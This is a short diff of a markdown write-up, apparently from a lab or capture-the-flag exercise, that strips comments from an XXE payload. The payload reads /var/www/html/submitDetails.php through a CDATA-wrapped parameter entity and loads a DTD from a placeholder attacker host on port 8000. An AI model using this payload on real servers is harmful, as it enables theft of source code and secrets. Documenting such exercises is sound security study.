@@ -56,13 +56,13 @@ python3 -m http.server 8000
 ```xml
 <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA[">
-  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
   <!ENTITY % end "]]>">
   <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
   %xxe;
 ]>
 ...
-<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+<email>&joined;</email>
 ```
 
 ![[Pasted image 20241009203307.png]]
